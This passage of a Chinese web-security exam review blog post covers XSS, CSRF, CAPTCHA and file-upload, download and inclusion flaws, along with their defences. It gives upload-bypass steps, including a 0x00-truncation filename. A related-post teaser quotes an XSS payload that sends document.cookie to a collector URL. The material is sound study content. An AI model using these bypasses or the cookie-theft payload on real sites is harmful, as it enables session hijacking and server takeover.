+<li>常见场景：用户提交信息（如发帖、留言等）中嵌入恶意代码。</li>
+</ul>
+</li>
+<li><strong>XSS攻击分类</strong>：<ul>
+<li><strong>非持久型XSS攻击</strong>：恶意代码不存储在数据库中。</li>
+<li><strong>持久型XSS攻击</strong>：恶意代码存储在数据库中，浏览器解析时会被执行。</li>
+</ul>
+</li>
+<li><strong>XSS攻击危害</strong>：<ul>
+<li>干扰网页正常功能（如弹窗攻击）。</li>
+<li>窃取用户Cookie，威胁账号安全。</li>
+<li>执行其他攻击（如Session欺骗、获取敏感信息等）。</li>
+</ul>
+</li>
+</ol>
+<h5 id="XSS攻击防护"><a href="#XSS攻击防护" class="headerlink" title="XSS攻击防护"></a>XSS攻击防护</h5><ul>
+<li>设置Cookie的HttpOnly属性：<ul>
+<li>修改PHP代码：使用<code>setcookie()</code>函数设置<code>HttpOnly</code>。</li>
+<li>效果：阻止JavaScript脚本访问Cookie，避免SessionID被窃取。</li>
+</ul>
+</li>
+<li>HTML转义：<ul>
+<li>方法：对用户输入的HTML代码进行转义。</li>
+<li>示例：使用<code>htmlentities()</code>或<code>htmlspecialchars()</code>函数。</li>
+<li>效果：防止恶意HTML或JavaScript代码被浏览器解析和执行。</li>
+</ul>
+</li>
+<li>JavaScript转义：<ul>
+<li>问题：JavaScript中可通过Unicode编码绕过HTML转义。</li>
+<li>解决方案：使用<code>json_encode()</code>函数对用户数据进行安全编码。</li>
+</ul>
+</li>
+</ul>
+<h4 id="项目11-CSRF-跨站伪造请求攻击"><a href="#项目11-CSRF-跨站伪造请求攻击" class="headerlink" title="项目11 CSRF 跨站伪造请求攻击"></a>项目11 CSRF 跨站伪造请求攻击</h4><ul>
+<li><p>原理：利用 CSRF 跨站伪造请求攻击，通过诱导用户点击恶意链接，以用户的名义向目标网站发送请求，执行恶意操作。</p>
+</li>
+<li><p>概念：CSRF 跨站攻击、同源策略、HTTP Referer 验证、操作确认对话框、Token 验证。</p>
+</li>
+</ul>
+<h5 id="CSRF攻击基础知识"><a href="#CSRF攻击基础知识" class="headerlink" title="CSRF攻击基础知识"></a>CSRF攻击基础知识</h5><ol>
+<li><strong>CSRF攻击的原理</strong>：<ul>
+<li>全称：Cross Site Request Forgery（跨站伪造请求）。</li>
+<li>核心机制：利用用户浏览器中保存的身份认证信息（如Cookie），在用户不知情的情况下伪造请求并冒用用户身份。</li>
+<li>形成条件：<ul>
+<li>用户已登录目标网站，浏览器中保存了认证Cookie。</li>
+<li>用户访问了另一个含有恶意代码的网页，该网页向目标网站发起伪造请求。</li>
+</ul>
+</li>
+<li>关键特点：攻击者无法直接获取用户数据，但可冒充用户操作。</li>
+</ul>
+</li>
+<li><strong>CSRF攻击的危害</strong>：<ul>
+<li>在用户不知情的情况下完成伪造操作（如转账、消费积分、修改信息等）。</li>
+<li>破坏网站的权限控制机制。</li>
+<li>危害程度依赖于目标网站的敏感操作内容。</li>
+</ul>
+</li>
+</ol>
+<h5 id="CSRF攻击测试"><a href="#CSRF攻击测试" class="headerlink" title="CSRF攻击测试"></a>CSRF攻击测试</h5><ol>
+<li><strong>测试过程</strong>：<ul>
+<li><strong>测试前提</strong>：用户在浏览器中已登录目标网站。</li>
+<li>测试实施：<ul>
+<li>在保持目标网站登录状态的浏览器中，访问攻击网页（<code>csrf.html</code>）。</li>
+<li>点击攻击链接，目标网站后台接收伪造请求并添加恶意用户。</li>
+</ul>
+</li>
+<li>测试现象：<ul>
+<li>用户未察觉情况下，目标网站新增了恶意用户。</li>
+</ul>
+</li>
+<li>测试条件分析：<ul>
+<li>成功的CSRF攻击需满足以下条件：<ol>
+<li>用户登录目标网站。</li>
+<li>用户访问了含有恶意代码的网页。</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>测试结论</strong>：<ul>
+<li>CSRF攻击的本质是利用了用户身份认证机制的漏洞。</li>
+<li>Get和Post请求均可用于CSRF攻击（通过隐藏表单实现Post提交）。</li>
+</ul>
+</li>
+</ol>
+<h5 id="CSRF攻击防护"><a href="#CSRF攻击防护" class="headerlink" title="CSRF攻击防护"></a>CSRF攻击防护</h5><p><strong>防护方法1：HTTP Referer验证</strong></p>
+<ul>
+<li><p>原理：</p>
+<ul>
+<li>检查请求头中的Referer字段，验证请求来源是否合法。</li>
+</ul>
+</li>
+<li><p>实现步骤：</p>
+<ol>
+<li><p>修改<code>do_adduser.php</code>文件，添加Referer验证函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_referrer</span>(<span class="hljs-params"><span class="hljs-variable">$referer</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] !== <span class="hljs-variable">$referer</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid request source&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">check_referrer</span>(<span class="hljs-string">&#x27;http://localhost/csrf/newuser.html&#x27;</span>);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>重复CSRF攻击测试，验证攻击失败。</p>
+</li>
+</ol>
+</li>
+<li><p>优缺点：</p>
+<ul>
+<li>优点：有效拦截非正常来源的请求。</li>
+<li>缺点：依赖于浏览器的Referer字段支持，部分浏览器可能关闭此字段。</li>
+</ul>
+</li>
+</ul>
+<p><strong>防护方法2：操作确认对话框</strong></p>
+<ul>
+<li>原理：<ul>
+<li>在敏感操作前弹出确认对话框，用户手动确认操作真实性。</li>
+</ul>
+</li>
+<li>实现步骤：<ol>
+<li>修改<code>do_adduser.php</code>文件，添加操作确认提示。</li>
+<li>当用户点击恶意链接时，弹出提示，选择“否”可阻止伪造操作。</li>
+</ol>
+</li>
+<li>优缺点：<ul>
+<li>优点：阻止用户误操作。</li>
+<li>缺点：用户可能忽略提示直接确认。</li>
+</ul>
+</li>
+</ul>
+<p><strong>其他防护方法</strong>：</p>
+<ul>
+<li>使用Token验证：<ul>
+<li>在表单中嵌入唯一Token，提交请求时验证Token是否合法。</li>
+<li>缺点：攻击者可通过先访问合法表单获取Token后再发起伪造请求。</li>
+</ul>
+</li>
+<li>设置Cookie的<code>HttpOnly</code>属性：<ul>
+<li>阻止JavaScript访问Cookie，减少SessionID被窃取的风险。</li>
+</ul>
+</li>
+</ul>
+<h4 id="项目12-验证码"><a href="#项目12-验证码" class="headerlink" title="项目12 验证码"></a>项目12 验证码</h4><ul>
+<li><p>原理：利用验证码，通过人工识别的方式，防止自动化工具进行密码破解等恶意攻击。</p>
+</li>
+<li><p>概念：验证码、CAPTCHA、OCR、机器学习、在线暴力攻击、人机识别。</p>
+</li>
+</ul>
+<h5 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h5><ol>
+<li><strong>Web登录密码暴力破解原理</strong>：<ul>
+<li>暴力破解方法：利用字典枚举所有可能的用户名和密码组合，逐一尝试登录。</li>
+<li>自动化工具：通过软件模拟HTTP登录请求，检查服务器返回信息确认登录是否成功。</li>
+<li>常用工具：<strong>Hydra</strong>，支持多种协议的在线密码暴力破解工具。</li>
+</ul>
+</li>
+<li><strong>验证码的作用</strong>：<ul>
+<li>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。验证码用于区分计算机与人类用户，防止自动化攻击。</li>
+<li>常见用途：<ul>
+<li>防止密码暴力破解。</li>
+<li>防止自动化批量注册。</li>
+<li>防止恶意搜索和刷票等活动。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>验证码设计要点</strong>：<ul>
+<li>服务器端生成验证码，确保无法通过客户端伪造。</li>
+<li>验证码需有有效期和使用限制，避免重复使用。</li>
+<li>验证码复杂度需平衡安全性与用户体验。</li>
+</ul>
+</li>
+<li><strong>验证码面临的挑战</strong>：<ul>
+<li>OCR（光学字符识别）技术和机器学习的发展使简单验证码易被破解。</li>
+<li>图片滑动验证（如阿里云）和reCAPTCHA等复杂验证方式是应对现代攻击的主流方案。</li>
+</ul>
+</li>
+</ol>
+<h5 id="拓展思考"><a href="#拓展思考" class="headerlink" title="拓展思考"></a>拓展思考</h5><ol>
+<li><strong>哪些功能需要验证码？</strong><ul>
+<li>登录页面、防止暴力破解。</li>
+<li>用户注册、防止批量注册。</li>
+<li>敏感操作（如密码重置、防止账户盗用）。</li>
+</ul>
+</li>
+<li><strong>验证码能否杜绝自动化攻击？</strong><ul>
+<li>验证码难以完全杜绝自动化攻击，但能大幅提高攻击成本。</li>
+<li>强化验证码方案（如短信验证、滑动验证）是更安全的选择。</li>
+</ul>
+</li>
+<li><strong>如何应对高级攻击？</strong><ul>
+<li>结合多因素认证（如动态口令、硬件令牌）。</li>
+<li>监控异常登录行为并触发额外验证。</li>
+</ul>
+</li>
+</ol>
+<h3 id="第四篇-文件漏洞及防护"><a href="#第四篇-文件漏洞及防护" class="headerlink" title="第四篇 文件漏洞及防护"></a>第四篇 文件漏洞及防护</h3><h4 id="项目13-文件上传漏洞"><a href="#项目13-文件上传漏洞" class="headerlink" title="项目13 文件上传漏洞"></a>项目13 文件上传漏洞</h4><ul>
+<li><p>原理：利用文件上传漏洞，上传恶意文件，获取服务器权限，甚至控制整个系统。</p>
+</li>
+<li><p>概念：文件上传漏洞、MIME 类型检测、文件类型过滤、0x00 截断、文件解析漏洞、白名单过滤、黑名单过滤。</p>
+</li>
+</ul>
+<h5 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h5><ol>
+<li><strong>文件上传漏洞概述</strong>：<ul>
+<li>文件上传是Web系统中常见功能，但由于控制不严格，攻击者可能通过漏洞上传恶意文件（如网页木马），实现对服务器的控制。</li>
+<li>主要的文件上传漏洞类型：<ul>
+<li><strong>MIME类型检测绕过</strong>。</li>
+<li><strong>文件类型过滤不严格</strong>。</li>
+<li><strong>文件名/路径0x00截断漏洞</strong>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>常见文件上传漏洞类型</strong>：<ul>
+<li>MIME文件上传漏洞：<ul>
+<li>MIME（多用途互联网邮件扩展类型）通过HTTP协议为文件提供数据格式标识。</li>
+<li>攻击方式：利用抓包工具修改文件的MIME类型，绕过服务器检测。</li>
+</ul>
+</li>
+<li>文件类型过滤不严格：<ul>
+<li>文件扩展名检查时未考虑大小写或未严格匹配。</li>
+<li>例如：通过<code>.Php</code>绕过<code>.php</code>过滤规则。</li>
+</ul>
+</li>
+<li>文件名/路径0x00截断漏洞：<ul>
+<li>利用0x00（空字符）的截断特性，使服务器保存的文件名被截断。</li>
+<li>例：文件名<code>1.php 0x00 abc.jpg</code>在某些低版本PHP中被保存为<code>1.php</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h5 id="文件上传漏洞攻击测试"><a href="#文件上传漏洞攻击测试" class="headerlink" title="文件上传漏洞攻击测试"></a>文件上传漏洞攻击测试</h5><ol>
+<li><strong>工具选择</strong>：<ul>
+<li>使用Fiddler进行抓包和HTTP数据包编辑。</li>
+<li>其他抓包工具（如Burp Suite、Wireshark）也可用于类似测试。</li>
+</ul>
+</li>
+<li><strong>漏洞攻击类型</strong>：<ul>
+<li><strong>MIME文件上传漏洞</strong>：<ul>
+<li>步骤：<ol>
+<li>创建一个<code>.php</code>文件（如<code>info.php</code>），测试直接上传是否被服务器阻止。</li>
+<li>使用Fiddler抓包，修改文件的MIME类型为允许的类型（如<code>image/jpeg</code>）。</li>
+<li>重放修改后的请求，成功绕过文件类型检测，上传<code>.php</code>文件。</li>
+<li>通过浏览器访问上传的<code>.php</code>文件，确认被服务器解析。</li>
+</ol>
+</li>
+<li>原理：服务器通过<code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>读取MIME类型，容易被抓包工具篡改。</li>
+</ul>
+</li>
+<li><strong>0x00截断路径上传漏洞</strong>：<ul>
+<li>步骤：<ol>
+<li>将<code>.php</code>文件改名为<code>.jpg</code>，上传时使用Fiddler抓包。</li>
+<li>在上传路径中插入<code>0x00</code>（空字符），如<code>1.php0x00info.jpg</code>。</li>
+<li>重放修改后的请求，成功将文件保存为<code>.php</code>类型，并利用漏洞访问。</li>
+</ol>
+</li>
+<li>原理：低版本PHP中未对路径合法性进行严格检查，<code>0x00</code>之后的内容会被截断。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>攻击分析</strong>：<ul>
+<li>MIME类型检测不可靠，易被抓包工具修改绕过。</li>
+<li>文件名/路径的<code>0x00</code>截断漏洞在低版本PHP中存在，但高版本PHP已修复。</li>
+</ul>
+</li>
+</ol>
+<h5 id="文件上传漏洞防护"><a href="#文件上传漏洞防护" class="headerlink" title="文件上传漏洞防护"></a>文件上传漏洞防护</h5><ol>
+<li><strong>防护方法</strong>：<ul>
+<li>判断路径变量：<ul>
+<li>使用路径白名单机制，限制路径变量为预定义的合法值。</li>
+<li>在低版本PHP中，可有效防护路径截断攻击。</li>
+</ul>
+</li>
+<li>文件重命名：<ul>
+<li>上传文件时，重新生成唯一文件名，并以白名单中允许的扩展名保存。</li>
+<li>优点：防止文件名截断和超长文件名攻击。</li>
+<li>缺点：无法防止路径截断问题。</li>
+</ul>
+</li>
+<li>设置非Web目录保存文件：<ul>
+<li>将上传文件存储在非Web目录下（如<code>C:\uploads</code>），避免直接访问上传文件。</li>
+<li>使用<code>readfile()</code>函数读取文件内容并提供下载。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>防护效果测试</strong>：<ul>
+<li>升级PHP版本后，确认<code>0x00</code>路径截断漏洞修复。</li>
+<li>针对MIME检测绕过，验证文件扩展名过滤的可靠性。</li>
+<li>测试非Web目录方案，确保文件无法直接通过URL访问。</li>
+</ul>
+</li>
+</ol>
+<h5 id="拓展思考-1"><a href="#拓展思考-1" class="headerlink" title="拓展思考"></a>拓展思考</h5><ol>
+<li><strong>如何利用0x00截断攻击上传文件？</strong><ul>
+<li>在上传路径中插入<code>0x00</code>字符，截断路径或文件名以实现攻击。</li>
+<li>示例路径：<code>uploads/1.php0x00info.jpg</code>。</li>
+</ul>
+</li>
+<li><strong>如何使用黑名单过滤文件上传？</strong><ul>
+<li>列出所有不允许的文件扩展名（如<code>.php</code>、<code>.exe</code>）。</li>
+<li>缺点：无法穷尽所有可能的恶意扩展名，不如白名单可靠。</li>
+</ul>
+</li>
+</ol>
+<h4 id="项目14-文件下载漏洞"><a href="#项目14-文件下载漏洞" class="headerlink" title="项目14 文件下载漏洞"></a>项目14 文件下载漏洞</h4><ul>
+<li><p>原理：利用文件下载漏洞，下载服务器中的敏感信息，例如数据库、配置文件等。</p>
+</li>
+<li><p>概念：文件下载漏洞、open_basedir 安全选项、正则表达式过滤、路径参数过滤。</p>
+</li>
+</ul>
+<p><strong>定义</strong>：攻击者通过漏洞下载服务器中的敏感文件</p>
+<p><strong>防护方法</strong></p>
+<ol>
+<li>使用<code>open_basedir</code>限制PHP脚本访问目录</li>
+<li>使用正则表达式过滤路径参数</li>
+<li>验证并限制用户输入的路径参数</li>
+</ol>
+<h4 id="项目15-文件解析漏洞"><a href="#项目15-文件解析漏洞" class="headerlink" title="项目15 文件解析漏洞"></a>项目15 文件解析漏洞</h4><ul>
+<li><p>原理：利用 Apache 服务器的文件解析漏洞，绕过文件类型限制，上传 PHP 木马文件，获取服务器权限。</p>
+</li>
+<li><p>概念：文件解析漏洞、Apache 解析特性、.htaccess 文件、文件类型限制、危险函数。</p>
+</li>
+</ul>
+<p><strong>定义</strong>：绕过文件类型限制，上传并解析恶意文件获取服务器权限</p>
+<p><strong>防护方法</strong></p>
+<ol>
+<li>使用<code>.htaccess</code>限制文件解析类型</li>
+<li>严格文件类型检查，允许特定类型</li>
+<li>禁用危险函数（如<code>exec()</code>, <code>system()</code>）</li>
+</ol>
+<h4 id="项目16-文件包含漏洞"><a href="#项目16-文件包含漏洞" class="headerlink" title="项目16 文件包含漏洞"></a>项目16 文件包含漏洞</h4><ul>
+<li><p>原理：利用文件包含漏洞，包含服务器中的非法文件，执行恶意代码，获取服务器权限。</p>
+</li>
+<li><p>概念：文件包含漏洞、open_basedir 安全选项、正则表达式过滤、文件名过滤。</p>
+</li>
+</ul>
+<p><strong>定义</strong>：通过包含非法文件执行恶意代码，获取服务器权限</p>
+<p>防护方法</p>
+<ol>
+<li>使用<code>open_basedir</code>限制包含文件目录</li>
+<li>使用正则表达式过滤文件名</li>
+<li>仅允许特定文件名或路径包含</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://moyuan10086.github.io">moyuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://moyuan10086.github.io/2025/01/05/web-security-exam-review/">https://moyuan10086.github.io/2025/01/05/web-security-exam-review/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://moyuan10086.github.io" target="_blank">Moyuan's website</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><a class="post-meta__tags" href="/tags/%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/">认证与授权</a></div><div class="post-share"><div class="social-share" data-image="/images/post-covers/post-cover-34.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/08/21/catalan-numbers/" title="卡特兰数（Catalan Number）：核心原理与应用模型"><img class="cover" src="/images/post-covers/post-cover-05.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">卡特兰数（Catalan Number）：核心原理与应用模型</div></div><div class="info-2"><div class="info-item-1">卡特兰数卡塔兰数（Catalan number）是一个在组合数学中非常重要的数列，广泛应用于多种结构的计数问题。卡塔兰数的第 n 项通常用 $C_n$ 表示，表示可以由 n 个节点构成的不同二叉树的个数，也可以表示其它多种组合结构的数量。 卡塔兰数的定义卡塔兰数的第 n 项可以通过以下递推公式或闭式公式来计算：  递推公式：  C_0 = 1 C_n = \sum_{i=0}^{n-1} C_i C_{n-i-1} \quad \text{(其中，} n \geq 1\text{)}这个递推公式表达了卡塔兰数的结构：假设我们想构造一个有 n 个节点的二叉树，可以先选定一个根节点，剩下的 n-1 个节点可以分为左右子树，左子树有 i 个节点，右子树有 n-i-1 个节点，于是根节点两边的子树的不同构造方法分别是 $Ci$ 和 $C{n-i-1}$。  闭式公式：  C_n = \frac{1}{n+1} \binom{2n}{n} = \frac{(2n)!}{(n+1)!n!}这个公式表达了卡塔兰数的一种常见计算方式。   卡塔兰数的应用卡塔兰数在组合数学中有着丰富的应用，例如：...</div></div></div></a><a class="pagination-related" href="/2024/12/13/malware-detection-ml-dl-study/" title="实验报告：基于机器学习与深度学习的勒索病毒检测研究"><img class="cover" src="/images/post-covers/post-cover-18.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">实验报告：基于机器学习与深度学习的勒索病毒检测研究</div></div><div class="info-2"><div class="info-item-1">实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究实验背景随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：  设计一个简单的勒索病毒Demo，了解恶意程序的基本行为。 利用机器学习方法检测恶意程序。 利用深度学习方法检测并分类恶意程序。  第一部分：勒索病毒Demo设计实验目的利用ChatGPT实现一个勒索病毒的简化模型，模拟文件加密与解密流程，探究恶意程序的行为特征。 技术实现 加密功能： 遍历当前目录及子目录中的所有文件。 使用简单的异或加密算法(XOR)加密文件内容，并将加密后的文件扩展名改为.exe。 删除原始文件，保留加密后的文件。   解密功能： 遍历加密文件，使用相同的XOR解密逻辑还原原始文件。 删除加密文件，恢复文件原始状态。    代码逻辑 文件遍历：使用Windows API...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/12/03/xss-cookie-hijacking-experiment/" title="XSS 跨站攻击与 Cookie 验证欺骗实验"><img class="cover" src="/images/post-covers/post-cover-32.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">XSS 跨站攻击与 Cookie 验证欺骗实验</div></div><div class="info-2"><div class="info-item-1">XSS跨站攻击与Cookie验证欺骗实验一、实验目的 研究并实践XSS攻击的原理与实现方式。 实现通过XSS攻击获取网页地址、User-Agent及Cookie的方法。 提交实验代码与报告，验证攻击与防护效果。   二、XSS跨站攻击实现细节1. 基本原理XSS是一种通过注入恶意代码在用户浏览器中执行非授权操作的攻击方式。主要分为：  持久型XSS：恶意代码存储在服务器，能长期触发。 非持久型XSS：恶意代码不存储，依赖特定URL。  2. 利用XSS攻击Cookie验证通过XSS脚本，将目标用户的Cookie发送至攻击者控制的服务器，绕过正常验证实现欺骗。 代码示例：在留言表单中插入： 1&lt;a href=&quot;#&quot; onclick=&quot;document.location=&#x27;http://localhost/getsession/savesession.php?cookie=&#x27;+escape(document.cookie);&quot;&gt;Click Me&lt;/a&gt;  当管理员点击链接时，document.cook...</div></div></div></a><a class="pagination-related" href="/2024/12/04/csrf-attack-and-defense/" title="CSRF 跨站请求伪造攻击原理与防御实践"><img class="cover" src="/images/post-covers/post-cover-09.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-04</div><div class="info-item-2">CSRF 跨站请求伪造攻击原理与防御实践</div></div><div class="info-2"><div class="info-item-1">CSRF攻击与防护1. 背景与原理1.1 CSRF攻击定义 CSRF（Cross Site Request Forgery，跨站请求伪造）是一种利用用户身份权限的攻击方式。 攻击者诱导已登录目标网站的用户访问含有恶意代码的页面，伪造用户的合法请求，执行未授权操作。  1.2 CSRF攻击的原理 浏览器的同源策略允许同源的网页共享Cookie，但攻击者可以利用此策略： 用户登录目标网站后，浏览器保存Cookie。 用户访问恶意页面时，页面中的恶意代码通过伪造请求，利用用户Cookie向目标网站发送恶意请求。    1.3 CSRF攻击的危害 在用户毫不知情的情况下： 窃取用户信息。 未经授权的资金转移。 操作敏感的账户功能。     2. 项目任务概述实验通过创建两个网站（目标网站和攻击网站），模拟CSRF攻击并探讨防护措施。具体任务如下：  建立一个具有用户添加功能的目标网站（存在CSRF漏洞）。 创建一个模拟CSRF攻击的网站。 测试目标网站是否可以被CSRF攻击。 通过HTTP Referer验证和操作确认对话框两种方式防护CSRF攻击。   3. 实验过程3.1 任务1：建...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/newnewlogo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">moyuan</div><div class="author-info-description">prograing or coffee</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">215</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/moyuan10086"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/moyuan10086" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2572045628@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%B5%84%E6%96%99"><span class="toc-text">Web安全技术与应用期末复习资料</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E5%9E%8B%E5%88%86%E5%B8%83"><span class="toc-text">题型分布</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E4%B9%A0%E5%BB%BA%E8%AE%AE"><span class="toc-text">复习建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AF%87-%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-text">第一篇 预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE1-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B3%E5%8F%B0%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="toc-text">项目1 Web 服务器平台安装与配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE2-Web-%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80"><span class="toc-text">项目2 Web 开发基础</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AF%87-SQL-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E6%8A%A4"><span class="toc-text">第二篇 SQL 注入攻击及防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE3-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95Post-%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">项目3 万能密码登录Post 型注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A8%E5%8D%95-Form"><span class="toc-text">表单 (Form)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Session%E6%9C%BA%E5%88%B6"><span class="toc-text">Session机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">SQL注入攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E6%B3%95"><span class="toc-text">防护方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE4-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9A%B4%E5%BA%93Get-%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">项目4 数据库暴库Get 型注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML-Get%E6%96%B9%E5%BC%8F%E6%8F%90%E4%BA%A4%E5%8E%9F%E7%90%86"><span class="toc-text">HTML Get方式提交原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9A%B4%E5%BA%93"><span class="toc-text">数据库暴库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Get%E5%9E%8B%E4%B8%8EPost%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">Get型与Post型SQL注入的区别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="toc-text">防护方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" 